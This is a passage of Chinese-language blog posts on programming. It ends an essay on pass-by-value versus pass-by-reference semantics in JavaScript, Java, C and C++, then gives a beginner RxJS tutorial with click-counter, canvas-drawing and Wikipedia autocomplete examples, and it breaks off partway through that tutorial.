Call by value，指的是傳遞參數時，一律傳遞變數所儲存的值，無論是基本型態或是類別宣告的型態都一樣，Java 中不允許處理記憶體位址，所以用了「參考」這個名稱來作為解釋類別型態所宣告的變數之行為，但這邊的「參考」與 C++ 中所稱之「參考」，是完全不相同的行為，更不會有 C++ 中參數的傳值、傳參考、return 的傳值、傳參考的 Call by reference 行為。 就是呢，我們傳進去的的確是 reference，但這個 reference 跟 C++ 裡面所稱的「call by reference」其實是不一樣的，所以不能稱作「call by reference」。 這一段其實跟犀牛書裡面11.2. By Value Versus by Reference提到的是差不多的： Before we leave the topic of manipulating objects and arrays by reference, we need to clear up a point of nomenclature. The phrase “pass by reference” can have several meanings. To some readers, the phrase refers to a function invocation technique that allows a function to assign new values to its arguments and to have those modified values visible outside the function. This is not the way the term is used in this book. Here, we mean simply that a reference to an object or array – not the object itself – is passed to a function. A function can use the reference to modify properties of the object or elements of the array. But if the function overwrites the reference with a reference to a new object or array, that modification is not visible outside of the function. Readers familiar with the other meaning of this term may prefer to say that objects and arrays are passed by value, but the value that is passed is actually a reference rather than the object itself 不過這個時候我有了另外一個疑問：那 C++ 裡面的 call by reference 到底是怎樣？ 嗯，看來是時候複習一下很久沒碰的 C 跟 C++了。 C 與 C++ 的參數傳遞 先從 C 開始吧，C 裡面就只有一種：call by value。 1234567891011121314#include &lt;stdio.h&gt; void swap(int a, int b) &#123; int temp = b; b = a; a = temp;&#125; int main()&#123; int x = 10; int y = 20; swap(x, y); printf(\"%d %d\\n\", x, y); // 10, 20&#125; 就像我們一開始所說的，這樣子並不會把x跟y的值交換，因為a跟b只是儲存的值跟x與y一樣而已，除此之外一點關係都沒有。 可是呢，我們之前有提到，C 裡面有個東西叫做「指標」，能夠儲存記憶體位置。透過指標我們其實可以在 function 裡面更改外部變數的值。 123456789101112131415161718#include &lt;stdio.h&gt; void swap(int *a, int *b) &#123; // 印出 a 跟 b 所存的值 printf(\"%ld, %ld\", a, b); //0x44, 0x40 int temp = *b; *b = *a; *a = temp;&#125; int main()&#123; int x = 10; int y = 20; // 印出 x 跟 y 的記憶體位置 printf(\"%ld %ld\\n\", &amp;x, &amp;y); // 0x44, 0x40 swap(&amp;x, &amp;y); // 傳記憶體位置進去 printf(\"%d %d\\n\", x, y); // 20, 10&#125; 我們這次傳進去 function 的不是一個變數，而是一個記憶體位置，在swap裡面用指標來接受這個記憶體位置，接著就可以透過指標的操作把外面x與y的值改掉。 這樣依然叫做 call by value，如果你還是不清楚為什麼，可以參考下面這個範例。跟上面的差別在於我先宣告兩個指標指向x跟y： 123456789101112131415161718192021222324#include &lt;stdio.h&gt; void swap(int *a, int *b) &#123; // 印出 a 跟 b 所存的值 printf(\"%ld, %ld\", a, b); //0x44, 0x40 int temp = *b; *b = *a; *a = temp;&#125; int main()&#123; int x = 10; int y = 20; // 兩個指標指向 x 跟 y int* ptr_x = &amp;x; int* ptr_y = &amp;y; // 印出 x 跟 y 的記憶體位置（就是 ptr_x 跟 ptr_y 存的值） printf(\"%ld %ld\\n\", ptr_x, ptr_y); // 0x44, 0x40 swap(ptr_x, ptr_y); // 傳記憶體位置進去 printf(\"%d %d\\n\", x, y); // 20, 10&#125; 還記得前面說過的 call by value 的定義嗎？就是把變數的值複製一份傳進去。這邊也是一樣的，我們傳進去的兩個變數ptr_x跟ptr_y儲存了x跟y的記憶體位置，而我們在呼叫 function 的時候就把這兩個「值」給複製一份傳進去，所以 function 裡面的a跟b印出來的值就會跟ptr_x以及ptr_y存的值一樣。 簡單來說就是以前我們 call by value 的「value」可能是數字，可能是字串，而現在的範例這個 value 是「記憶體位置」，也是資料型態的一種。 不過，也有人把這樣子稱為 call by pointer 或是 call by address，但原則上都是 call by value 的一種。 在這邊還有一個可以特別注意的地方，那就是儘管a跟ptr_x的「值」一樣，但這兩個還是不一樣的變數，有著不同的記憶體位置。 再來我們看 C++ 中的 call by reference 到底是怎樣，只要在 function 的引數那裡加上&amp;，就會變成 call by reference： 12345678910111213141516171819202122#include &lt;stdio.h&gt; // 注意到這邊多了 &amp;，其他都跟 call by value 一模一樣void swap(int &amp;a, int &amp;b) &#123; // 印出 a 跟 b 所存的值與記憶體位置 printf(\"%ld, %ld\\n\", a, b); // 10, 20 printf(\"%ld, %ld\\n\", &amp;a, &amp;b); // 0x44, 0x40 int temp = b; b = a; a = temp;&#125; int main()&#123; int x = 10; int y = 20; // 印出 x 跟 y 的記憶體位置 printf(\"%ld %ld\\n\", &amp;x, &amp;y); // 0x44, 0x40 swap(x, y); // 傳記憶體位置進去 printf(\"%d %d\\n\", x, y); // 20, 10&#125; 在這裡a跟b的記憶體位置與x跟y一模一樣，說明了在裡面操作a這個變數的時候，就是在操作x這個變數，兩者是一模一樣的，只是有了不同的名稱。當a重新賦值的時候，也會一併把外面x的值一起改掉。 看完了 C 跟 C++ 裡面 pass by value 跟 pass by reference 的區別，我開頭的疑惑：「如果你要從底層實作的原理來看，那 call by reference 不也是 call by value 的一種嗎？」就被解決了。 我認為這兩個最大的差異就在於一件事情：複製。 call by value 會把傳進去的值複製（無論那個值是數字也好，記憶體位置也好，都會複製一份），call by reference 在「最底層的實作」上當然也會有類似的行為，但是你感覺不出來。 就像我上面 call by reference 舉例的那段程式碼一樣，x的記憶體位置跟a一樣，y的記憶體位置跟b一樣，因此你可以說他們兩者是「一模一樣」的東西。 可是在 call by value 的範例中，就算你傳的是指標好了，只有「指標裡面存的值（也就是指到的記憶體位置）」是一樣的，但指標本身還是有不同的記憶體位置。 換句話說，在 call by value 的時候我們是「新建了一個變數a，並且讓a存的值跟傳進來的參數一樣」。在 call by reference 的時候，我們只是「讓a作為x的 alias，兩個是同樣的變數」，這是我認為這兩間之間最大的差異。 結論 我們從各個程式語言裡面看到了每一種程式語言的實現，那到底有沒有一種明確的定義，能夠區分 pass by value 以及 pass by reference 呢？ 我想了想，其實可以從「行為」上面來判別到底是屬於哪一種。與其由定義來看，不如直接從行為來加以區分，不同種類能夠達成的行為都不一樣。第一個條件用來區分到底是 pass by value 還是 pass by reference：「在函式裡對引數重新賦值，外面變數是否會改變？」 以 JavaScript 跟 Java 為例，在函式裡面重新賦值，外面的變數都不會變，所以就是屬於 pass by value。 如果你還想分得更細，來可以透過第二個條件來區分這個 pass by value 是真・pass by value 還是一個叫做 pass by sharing 的分支：「能否透過引數，改變外部變數的值」（我們這邊所指的「值」跟地址或引用無關，純粹在講像{numer:1}這樣子的值） 在 JavaScript 跟 Java 你都可以透過obj.number = 10之類的操作改變外部變數的值（obj.number 從 1 變成了 10），所以也能說是 pass by sharing。 根據第一個定義：「在函式裡對引數重新賦值，外面變數是否會改變？」，有人可能會發現如果是 C 裡面的指標，不是也可以達成嗎？可是 C 又說只有 call by value，不就衝突了嗎？ 但其實在指標的範例裡面，我們重新賦值的對象是*a而不是a（意思就是，我們是讓*a=10而不是a=10），但後者才叫對引數重新賦值（給a一個新的地址），前者是「對指標所指向的記憶體位置重新賦值」。所以照這個定義來看，指標的範例依舊是 pass by value。 依據細分程度的不同，下面幾句話都是正確的： JavaScript 裡面只有 pass by value JavaScript 的 primitive type 是 pass by value，object 是 pass by sharing 心得 說實在的，其實我查了這麼一大堆資料之後，發現大家對 call by reference 以及 call by value 的「定義」其實都不盡相同，而且也沒有一個權威性的出處能夠保證這個定義是正確的（或許有但我沒找到，如果你知道的話請一定要告訴我在哪裡，拜託），才造成這麼多的歧異性。 有關技術名詞的解釋，我最喜歡引用這篇：技術名詞紛爭多： 程式開發的世界中，名詞的創造經常是隨意的，曾經在 Java 中爭執不斷的考古題之一是：「Java 中有沒有 Pass by reference」，就現今來說，大家公認的答案是沒有，Java 只有 Pass by value，不過還是有人面對 Java 文件中經常出現 reference，而搞不清楚。 說穿了，這個名詞與 C++ 中的 reference 定義不同，只不過 Java 最初不知道為什麼，也用了 reference 一詞，重點也不在搞清楚 Pass by value，重點是搞清楚透過參數操作物件時，會有什麼樣的行為。 我們從 JavaScript 研究到 Java，再從 Java 研究到 C 與 C++，為的就是想要搞清楚「pass by reference」的定義為何，但追根究底，會造成這樣子的誤會是因為對於「reference」一詞的定義不同。 如果你把 pass by reference 理解成像 C++ 那樣子的定義，那 Java 跟 JavaScript 都不會有 pass by reference。但如果你把 pass by reference 的「reference」理解成「對於物件的參考」，那 JavaScript 把 object 傳進去，其實就是把「對物件的參考」傳進去，那就可以解釋成是 pass by reference。 都是 reference 這個名詞太好用了，導致不同地方有不同的定義，但那些定義往往相似卻又不全然相同。 可是別忘了，重點其實不在這個，而是搞清楚到底參數在操作的時候會有怎樣的行為。你要知道 JavaScript 傳 object 進去的時候，可以更改原本物件的值，但重新賦值並不會影響到外部的 object。只要知道這一點，其他的我覺得都沒那麼重要了。 這次寫了一個很容易引戰的主題，但也覺得滿有趣的，如果你對這問題有不同的見解，覺得我有哪邊寫錯的話，歡迎指正，感謝。 參考資料 [Javascript] 關於 JS 中的淺拷貝和深拷貝 [筆記] 談談JavaScript中by reference和by value的重要觀念 重新認識 JavaScript: Day 05 JavaScript 是「傳值」或「傳址」？ Re: [問題] 請問傳參考到底是什麼? ECMA-262-3 in detail. Chapter 8. Evaluation strategy. 簡單介紹JavaScript參數傳遞 JavaScript 是传值调用还是传引用调用？ Values vs References semantics #160 You Don’t Know JS: Types &amp; Grammar Chapter 2: Values Parameter passing in Java - by reference or by value? Is Java “pass-by-reference” or “pass-by-value”? 傳值呼叫 Call by value？ java中的经典问题：传值与传引用 Java is Pass-by-Value, Dammit! 11.2. By Value Versus by Reference","link":"/2018/06/23/javascript-call-by-value-or-reference/"},{"title":"希望是最淺顯易懂的 RxJS 教學","text":"前言 關注 RxJS 已經好一段時間了，最早知道這個東西是因為 redux-observable，是一個 redux 的 middleware，Netflix 利用它來解決複雜的非同步相關問題，那時候我連redux-saga都還沒搞懂，沒想到就又有新的東西出來了。 半年前花了一些時間，找了很多網路上的資料，試圖想要搞懂這整個東西。可是對我來說，很多教學的步調都太快了，不然就是講得太仔細，反而讓初學者無所適從。 這次有機會在公司的新專案裡面嘗試導入redux-observable，身為提倡要導入的人，勢必要對這東西有一定的瞭解。秉持著這個想法，上週認真花了點時間再次把相關資源都研究了一下，漸漸整理出一套「我覺得應該可以把 RxJS 講得更好懂」的方法，在這邊跟大家分享一下。 在開始之前，要先大力稱讚去年 iT 邦幫忙鐵人賽的 Web 組冠軍：30 天精通 RxJS，這系列文章寫得很完整，感受得出來作者下了很多功夫在這上面。看完這篇之後如果對更多應用有興趣的，可以去把這系列的文章讀完。 好，那就讓我們開始吧！ 請你先忘掉 RxJS 沒錯，你沒看錯。 要學會 RxJS 的第一件事情就是：忘記它。 忘記有這個東西，完全忘記，先讓我講幾個其他東西，等我們需要講到 RxJS 的時候我會再提醒你的。 在我們談到主角之前，先來做一些有趣的事情吧！ 程式基礎能力測試 先讓我們做一個簡單的練習題暖身，題目是這樣的： 有一個陣列，裡面有三種類型的資料：數字、a~z組成的字串、數字組成的字串，請你把每個數字以及數字組成的字串乘以二之後加總 範例輸入：[1, 5, 9, 3, ‘hi’, ‘tb’, 456, ‘11’, ‘yoyoyo’] 你看完之後應該會說：「這有什麼難的？」，並且在一分鐘以內就寫出下面的程式碼： 123456789const source = [1, 5, 9, 3, 'hi', 'tb', 456, '11', 'yoyoyo'];let total = 0; for (let i = 0; i &lt; source.length; i++) &#123; let num = parseInt(source[i], 10); if (!isNaN(num)) &#123; total += num * 2; &#125;&#125; 相信大家一定都是很直覺的就寫出上面的程式碼，但如果你是個 functional programming 的愛好者，你可能會改用另外一種思路來解決問題： 1234567const source = [1, 5, 9, 3, 'hi', 'tb', 456, '11', 'yoyoyo']; let total = source .map(x =&gt; parseInt(x, 10)) .filter(x =&gt; !isNaN(x)) .map(x =&gt; x * 2) .reduce((total, value) =&gt; total + value ) 一開始的例子叫做Imperative（命令式），用陣列搭配一堆函式的例子叫做Declarative（聲明式）。如果你去查了一下定義，應該會看到這兩個的解釋： Imperative 是命令機器去做事情（how），這樣不管你想要的是什麼（what），都會按照你的命令實現；Declarative 是告訴機器你想要的是什麼（what），讓機器想出如何去做（how） 好，你有看懂上面這些在說什麼嗎？ 我是沒有啦。 所以讓我們再看一個例子，其實 Declarative 你已經常常在用了，只是你不知道而已，那就是 SQL： 1SELECT * from dogs INNER JOIN owners WHERE dogs.owner_id = owners.id 這句話就是：我要所有狗的資料加上主人的資料。 我只有說「我要」而已，那要怎麼拿到這些資料？我不知道，我也不用知道，都讓 SQL 底層決定怎麼去操作就好。 如果我要自己做出這些資料，在 JavaScript 裡面我必須這樣寫（程式碼取自声明式编程和命令式编程的比较）： 123456789101112131415161718//dogs = [&#123;name: 'Fido', owner_id: 1&#125;, &#123;...&#125;, ... ]//owners = [&#123;id: 1, name: 'Bob'&#125;, &#123;...&#125;, ...] var dogsWithOwners = []var dog, owner for(var di=0; di &lt; dogs.length; di++) &#123; dog = dogs[di] for(var oi=0; oi &lt; owners.length; oi++) &#123; owner = owners[oi] if (owner &amp;&amp; dog.owner_id == owner.id) &#123; dogsWithOwners.push(&#123; dog: dog, owner: owner &#125;) &#125; &#125;&#125; 應該可以大致體驗出兩者的差別吧？後者你必須自己一步步去決定該怎麼做，而前者只是僅僅跟你說：「我想要怎樣的資料」而已。 接著我們再把目光放回到把數字乘以二相加的那個練習。對我來說，最大的不同點是後面那個用陣列搭配函式的例子，他的核心概念是： 把原始資料經過一連串的轉換，變成你想要的資訊 這點超級重要，因為在一開始的例子中，我們是自己一步步去 parse，去檢查去相加，得出數字的總和。而後面的那個例子，他是把原始的資料（陣列），經過一系列的轉換（map, filter, reduce），最後變成了我們想要的答案。 畫成圖的話，應該會長這樣（請原諒我偷懶把乘二的部分拿掉了，但意思不影響）： 把原始資料經過一連串的轉換，最後變成你想要的答案，這點就是後者最大的不同。只要你有了這個基礎知識之後，再來看 RxJS 就不會覺得太奇怪了。 Reactive Programming 談到 RxJS 的時候，都會談到 Reactive 這個詞，那什麼是 Reactive 呢？可以從英文上的字義來看，這個單字的意思是：「反應、反應性的」，意思就是你要對一些事情做出反應。 所以 Reactive 其實就是在講說：「某些事情發生時，我能夠做出反應」。 讓我們來舉一個大家非常熟知的例子： 123window.addEventListener('click', function()&#123; console.log('click!');&#125;) 我們加了一個 event listener 在 window 上面，所以我們可以監聽到這個事件，每當使用者點擊的時候就列印出 log。換句話說，這樣就是：「當 window 被點擊時，我可以做出反應」。 正式進入 RxJS 如果你去看 ReactiveX 的網頁，你會發現他有明確的定義 ReactiveX： ReactiveX is a combination of the best ideas from the Observer pattern, the Iterator pattern, and functional programming 第一個 Observer pattern 就像是 event listener 那樣，在某些事情發生時，我們可以對其作出反應；第二個 Iterator pattern 我們跳過不講，我認為暫時不影響理解；第三個就像是一開始的例子，我們可以把一個陣列經過多次轉換，轉換成我們想要的資料。 在 Reactive Programming 裡面，最重要的兩個東西叫做 Observable 跟 Observer，其實一開始讓我最困惑的點是因為我英文不好，不知道這兩個到底誰是觀察的誰是被觀察的。 先把它們翻成中文，Observable 就是「可被觀察的」，Observer 就是所謂的「觀察者」。 這是什麼意思呢？就如同上面的例子一樣，當（可被觀察的東西）有事情發生，（Observer，觀察者）就可以做出反應。 直接舉一個例子你就知道了： 1234Rx.Observable.fromEvent(window, 'click') .subscribe(e =&gt; &#123; console.log('click~'); &#125;) 上面這段程式碼跟我幫 window 加上 event listener 在做的事情完全一樣，只是這邊我們使用了 RxJS 提供的方法叫做fromEvent，來把一個 event 轉成 Observable（可被觀察的），並且在最後加上 subscribe。 這樣寫就代表說我訂閱了這個 Observable，只要有任何事情發生，就會執行我傳進去的 function。 所以到底什麼是 Observable？ Observable 就是一個可被觀察的對象，這個對象可以是任何東西（例如說上述例子就是 window 的 click 事件），當有新資料的時候（例如說新的點擊事件），你就可以接收到這個新資料的資訊並且做出反應。 比起 Observable 這個冷冰冰的說法，我更喜歡的一個說法是 stream，資料流。其實每一個 Observable 就是一個資料流，但什麼是資料流？你就想像成是會一直增加元素的陣列就好了，有新的事件發生就 push 進去。如果你喜歡更專業一點的說法，可以叫它：「時間序列上的一連串資料事件」（取自 Reactive Programming 簡介與教學(以 RxJS 為例)） 或是我再舉一個例子，stream 的另外一個解釋就是所謂的「串流影片」，意思就是隨著你不斷播放，就會不斷下載新的片段進來。此時你腦中應該要有個畫面，就是像水流那樣，不斷有新的東西流進來，這個東西就叫做 stream。 （圖片取自 giphy） 我理解資料流了，然後呢？ 上面有說過，我們可以把任何一個東西轉成 Observable，讓它變成資料流，可是這不就跟 addEventListener 一樣嗎？有什麼特別的？ 有，還真的比較特別。 希望你沒有忘記我們剛開始做的那個小練習，就是把一個陣列透過一系列轉換，變成我們要的資料的那個練習。我剛剛有說，你可以把 Observable 想成是「會一直增加元素的陣列」，這代表什麼呢？ 代表我們也可以把 Observable 做一系列的轉換！我們也可以用那些用在陣列上的 function！ 12345Rx.Observable.fromEvent(window, 'click') .map(e =&gt; e.target) .subscribe(value =&gt; &#123; console.log('click: ', value) &#125;) 我們把 click 事件經過 map 轉換為點擊到的 element，所以當我們最後在 subscribe 的時候，收到的 value 就會是我們點擊的東西。 接著來看一個稍微進階一點的例子： 123456Rx.Observable.fromEvent(window, 'click') .map(e =&gt; 1) .scan((total, now) =&gt; total + now) .subscribe(value =&gt; &#123; document.querySelector('#counter').innerText = value; &#125;) 首先我們先把每一個 click 事件都透過map轉換成 1（或者你也可以寫成.mapTo(1)），所以每按一次就送出一個數字 1。scan的話其實就是我們一開始對陣列用的reduce，你可以想成是換個名字而已。透過scan加總以後傳給 subscriber，顯示在頁面上面。 就這樣簡單幾行，就完成了一個計算點擊次數的 counter。 可以用一個簡單的 gif 圖來表示上面的範例： 可是 Observable 不只這樣而已，接下來我們要進入到它最厲害的地方了。 威力無窮的組合技 如果把兩個陣列合併，會變成什麼？例如說[1, 2, 3]跟[4, 5, 6]？ 這要看你指的「合併」是什麼，如果是指串接，那就是[1, 2, 3, 4, 5, 6]，如果是指相加，那就是[5, 7, 9]。 那如果把兩個 Observable 合併會變成什麼？ Observable 跟陣列的差別就在於多了一個維度：時間。 Observable 是「時間序列上的一連串資料事件」，就像我前面講的一樣，可以看成是一個一直會有新資料進來的陣列。 我們先來看看一張很棒的圖，很清楚地解釋了兩個 Observable 合併會變成什麼： （取自：http://rxmarbles.com/#merge） 上面是一個 Observable，每一個圓點代表一個資料，下面也是一樣，把這兩個合併之後就變成最下面那一條，看圖解應該還滿好懂的，就像是把兩個時間軸合併一樣。 讓我們來看一個可以展現合併強大之處的範例，我們有 +1 跟 -1 兩個按鈕以及文字顯示現在的數字是多少： 該怎麼達成這個功能呢？基本的想法就是我們先把每個 +1 的 click 事件都通過mapTo變成數字 1，取叫 Observable_plus1 好了。再做出一個 Observable_minus1 是把每個 -1 的 click 事件都通過mapTo變成數字 -1。 把這兩個 Observable 合併之後，再利用剛剛提到的scan加總，就是目前應該要顯示的數字了！ 12345678910Rx.Observable.fromEvent(document.querySelector('input[name=plus]'), 'click') .mapTo(1) .merge( Rx.Observable.fromEvent(document.querySelector('input[name=minus]'), 'click') .mapTo(-1) ) .scan((total, now) =&gt; total + now) .subscribe(value =&gt; &#123; document.querySelector('#counter').innerText = value; &#125;) 如果你還是不懂的話，可以參考下面的精美範例，示範這兩個 Observable 是怎麼合在一起的（O代表點擊事件，+1跟-1則是mapTo之後的結果）： 讓我們來比較一下如果不用 Observable 的話，程式碼會長怎樣： 12345678910var total = 0;document.querySelector('input[name=plus]').addEventListener('click', () =&gt; &#123; total++; document.querySelector('#counter').innerText = total;&#125;) document.querySelector('input[name=minus]').addEventListener('click', () =&gt; &#123; total--; document.querySelector('#counter').innerText = total;&#125;) 有沒有發覺兩者真的差別很大？就如同我之前所說的，是兩種完全不同的思考模式，所以 Reactive Programming 困難的地方不是在於理解，也不是在於語法（這兩者相信你目前都有些概念了），而是在於換一種全新的思考模式。 以上面的寫法來說，就是告訴電腦：「按下加的時候就把一個變數 +1，然後更改文字；按下減的時候就 -1 並且也更改文字」，就可以達成計數器的功能。 以 Reactive 的寫法，就是把按下加當成一個資料流，把按下減也當成一個資料流，再透過各種 function 把這兩個流轉換並且合併起來，讓最後的那個流就是我們想要的結果（計數器）。 你現在應該能體會到我一開始說的了：「把原始資料經過一連串的轉換，最後變成你想要的答案」，這點就是 Reactive Programming 最大的特色。 組合技中的組合技 我們來看一個更複雜一點的範例，是在 canvas 上面實現非常簡單的繪圖功能，就是滑鼠按下去之後可以畫畫，放開來就停止。 要實現這個功能很間單，canvas 提供lineTo(x, y)這個方法，只要在滑鼠移動時不斷呼叫這個方法，就可以不斷畫出圖形來。但有一點要注意的是當你在按下滑鼠時，應該先呼叫moveTo(x, y)把繪圖的點移到指定位置，為什麼呢？ 假設我們第一次畫圖是在左上角，第二次按下滑鼠的位置是在右下角，如果沒有先用moveTo移動而是直接用lineTo的話，就會多一條線從左上角延伸到右下角。moveTo跟lineTo的差別就是前者只是移動，後者會跟上次的點連接在一起畫成一條線。 12345678910111213141516171819var canvas = document.getElementById('canvas');var ctx = canvas.getContext('2d');ctx.beginPath(); // 開始畫畫 function draw(e)&#123; ctx.lineTo(e.clientX,e.clientY); // 移到滑鼠在的位置 ctx.stroke(); // 畫畫&#125; // 按下去滑鼠才開始偵測 mousemove 事件canvas.addEventListener('mousedown', function(e)&#123; ctx.moveTo(e.clientX, e.clientY); // 每次按下的時候必須要先把繪圖的點移到那邊，否則會受上次畫的位置影響 canvas.addEventListener('mousemove', draw);&#125;) // 放開滑鼠就停止偵測 canvas.addEventListener('mouseup', function(e)&#123; canvas.removeEventListener('mousemove', draw);&#125;) 那如果在 RxJS 裡面，該怎麼實作這個功能呢？ 首先憑直覺，應該就是先加上mousedown的事件對吧！至少有個開頭。 1234Rx.Observable.fromEvent(canvas, 'mousedown') .subscribe(e =&gt; &#123; console.log('mousedown'); &#125;) 可是滑鼠按下去之後應該要變成什麼？這個時候應該要開始監聽mousemove對吧，所以我們這樣寫，用mapTo把每一個mousedown的事件都轉換成mousemove的 Observable： 1234567Rx.Observable.fromEvent(canvas, 'mousedown') .mapTo( Rx.Observable.fromEvent(canvas, 'mousemove') ) .subscribe(value =&gt; &#123; console.log('value: ', value); &#125;) 接著你看一下 console，你會發現每當我點擊的時候，console 就會印出FromEventObservable {_isScalar: false, sourceObj: canvas#canvas, eventName: &quot;mousemove&quot;, selector: undefined, options: undefined} 仔細想一下你會發現也滿合理的，因為我用mapTo把每一個滑鼠按下去的事件轉成一個 mousemove 的 Observable，所以用 subscribe 訂閱之後拿到的東西就會是這個 Observable。如果畫成圖，大概長得像這樣： 好了，那怎麼辦呢？我想要的其實不是 Observable 本身，而是屬於這個 Observable 裡面的那些東西啊！現在這個情形就是 Observable 裡面又有 Observable，有兩層，可是我想要讓它變成一層就好，該怎麼辦呢？ 在此提供一個讓 Observable 變簡單的訣竅： 只要有問題，先想想 Array 就對了！ 我前面有提過，可以把 Observable 看成是加上時間維度的進階版陣列，因此只要是陣列有的方法，Observable 通常也都會有。 舉例來說，一個陣列可能長這樣：[1, [2, 2.5], 3, [4, 5]]一共有兩層，第二層也是一個陣列。 如果想讓它變一層的話怎麼辦呢？壓平！ 有用過 lodash 或是其他類似的 library 的話，你應該有聽過_.flatten這個方法，可以把這種陣列壓平，變成：[1, 2, 2.5, 3, 4, 5]。 用 flat 這個關鍵字去搜尋 Rx 文件的話，你會找到一個方法叫做 FlatMap，簡單來說就是先map之後再自動幫你壓平。 所以，我們可以把程式碼改成這樣： 12345Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, 'mousemove')) .subscribe(e =&gt; &#123; console.log(e); &#125;) 當你點擊之後，會發現隨著滑鼠移動，console 會印出一大堆 log，就代表我們成功了。 畫成示意圖的話會變成這樣（為了方便說明，我把flatMap在圖片上變成map跟flatten兩個步驟）： 接下來呢？接下來我們要讓它可以在滑鼠鬆開的時候停止，該怎麼做呢？RxJS 有一個方法叫做takeUntil，意思就是拿到…發生為止，傳進去的參數必須是一個 Observable。 舉例來說，如果寫.takeUntil(window, 'click')，就表示如果任何window的點擊事件發生，這個 Observable 就會立刻終止，不會再送出任何資料。 應用在繪畫的例子上，我們只要把takeUntil後面傳的參數換成滑鼠鬆開就好！順便把subscribe跟畫畫的 function 也一起完成吧！ 123456Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, 'mousemove')) .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) .subscribe(e =&gt; &#123; draw(e); &#125;) 改完之後馬上來實驗一下！滑鼠按下去之後順利開始畫圖，鬆開以後畫圖停止，完美！ 咦，可是怎麼按下第二次就沒反應了？我們做出了一個「只能夠成功畫一次圖」的 Observable。 為什麼呢？我們可以先來看一下takeUntil的示意圖（取自：http://rxmarbles.com/#takeUntil） 以我們的情形來說，就是只要mouseup事件發生，「整個 Observable」就會停止，所以只有第一次能夠畫圖成功。但我們想要的其實不是這樣，我們想要的是只有mousemove停止而已，而不是整個都停止。 所以，我們應該把takeUntil放在mousemove的後面，也就是： 1234567Rx.Observable.fromEvent(canvas, 'mousedown') .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, 'mousemove') .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) ) .subscribe(e =&gt; &#123; draw(e); &#125;) 這樣子裡面的那個mousemove的 Observable 就會在滑鼠鬆開時停止發送事件，而我們最外層的這個 Observable 監聽的是滑鼠按下，會一直監聽下去。 到這邊其實就差不多了，但還有一個小 bug 要修，就是我們沒有在mousedown的時候利用moveTo移動，造成我們一開始說的那個會把上次畫的跟這次畫的連在一起的問題。 那怎麼辦呢？我已經把mousedown事件轉成其他資料流了，我要怎麼在mousedown的時候做事？ 有一個方法叫做do，就是為了這種情形而設立的，使用時機是：「你想做一點事，卻又不想影響資料流」，有點像是能夠針對不同階段 subscribe 的感覺，mousedown的時候 subscribe 一次，最後要畫圖的時候又 subscribe 一次。 12345678910Rx.Observable.fromEvent(canvas, 'mousedown') .do(e =&gt; &#123; ctx.moveTo(e.clientX, e.clientY) &#125;) .flatMap(e =&gt; Rx.Observable.fromEvent(canvas, 'mousemove') .takeUntil(Rx.Observable.fromEvent(canvas, 'mouseup')) ) .subscribe(e =&gt; &#123; draw(e); &#125;) 到這邊，我們就順利完成了畫圖的功能。 如果你想試試看你有沒有搞懂，可以實作看看拖拉移動物體的功能，原理跟這個很類似，都是偵測滑鼠的事件並且做出反應。 喝口水休息一下，下半場要開始了 上半場的目標在於讓你理解什麼是 Rx，並且掌握幾個基本概念： 一個資料流可以經過一系列轉換，變成另一個資料流 這些轉換基本上都跟陣列有的差不多，像是map、filter、flatten等等 你可以合併多個 Observable，也可以把二維的 Observable 壓平 下半場專注的點則是在於實戰應用，並且圍繞著 RxJS 最適合的場景之一：API。 前面我們有提到說可以把 DOM 物件的 event 變成資料流，但除了這個以外，Promise 其實也可以變成資料流。概念其實也很簡單啦，就是 Promise 被 resovle 的時候就發送一個資料，被 reject 的時候就終止。 讓我們來看一個簡單的小範例，每按一次按鈕就會發送一個 request 123456789function sendRequest () &#123; return fetch('https://jsonplaceholder.typicode.com/posts/1').then(res =&gt; res.json())&#125; Rx.Observable.fromEvent(document.querySelector('input[name=send]'), 'click') .flatMap(e =&gt; Rx.Observable.fromPromise(sendRequest())) .subscribe(value =&gt; &#123; console.log(value) &#125;) 這邊用flatMap的原因跟剛才的畫圖範例一樣，我們要在按下按鈕時，把原本的資料流轉換成新的資料流，如果只用map的話，會變成一個二維的 Observable，所以必須要用flatten把它壓平。 你可以試試看把flatMap改成map，你最後 subscribe 得到的值就會是一堆 Observable 而不是你想要的資料。 知道怎麼用 Rx 來處理 API 之後，就可以來做一個經典範例了：AutoComplete。 我在做這個範例的時候有極大部分參考30 天精通 RxJS(19): 實務範例 - 簡易 Auto Complete 實作、Reactive Programming 簡介與教學(以 RxJS 為例)以及构建流式应用—RxJS详解，再次感謝這三篇文章。 為了要讓大家能夠體會 Reactive Programming 跟一般的有什麼不一樣，我們先用老方法做出這個 Auto Complete 的功能吧！ 先來寫一下最底層的兩個函式，負責抓資料的以及 render 建議清單的，我們使用維基百科的 API 來當作範例： 12345678910111213141516function searchWikipedia (term) &#123; return $.ajax(&#123; url: 'http://en.wikipedia.org/w/api.php', dataType: 'jsonp', data: &#123; action: 'opensearch', format: 'json', search: term &#125; &#125;).promise();&#125; function renderList (list) &#123; $('.auto-complete__list').empty(); $('.auto-complete__list').append(list.map(item =&gt; '&lt;li&gt;' + item + '&lt;/li&gt;'))&#125; 這邊要注意的一個點是維基百科回傳的資料會是一個陣列，格式如下： 123456789[你輸入的關鍵字, 關鍵字清單, 每個關鍵字的介紹, 每個關鍵字的連結] // 範例：[ &quot;dd&quot;, [&quot;Dd&quot;, &quot;DDR3 SDRAM&quot;, &quot;DD tank&quot;], [&quot;&quot;, &quot;Double data rate type three SDRAM (DDR3 SDRAM)&quot;, &quot;DD or Duplex Drive tanks&quot;], [https://en.wikipedia.org/wiki/Dd&quot;, &quot;https://en.wikipedia.org/wiki/DDR3_SDRAM&quot;, &quot;...略&quot;]] 在我們的簡單示範中，只需要取 index 為 1 的那個關鍵字清單就好了。而renderList這個 function 則是傳進一個陣列，就會把陣列內容轉成li顯示出來。 有了這兩個最基礎的 function 之後，就可以很輕易地完成 Auto Complete 的功能： 12345document.querySelector('.auto-complete input').addEventListener('input', (e) =&gt; &#123; searchWikipedia(e.target.value).then((data) =&gt; &#123; renderList(data[1]) &#125;)&#125;) 程式碼應該很好懂，就是每次按下輸入東西的時候去 call api，把回傳的資料餵給renderList去渲染。 最基本的功能完成了，我們要來做一點優化，因為這樣子的實作其實是有一些問題的。 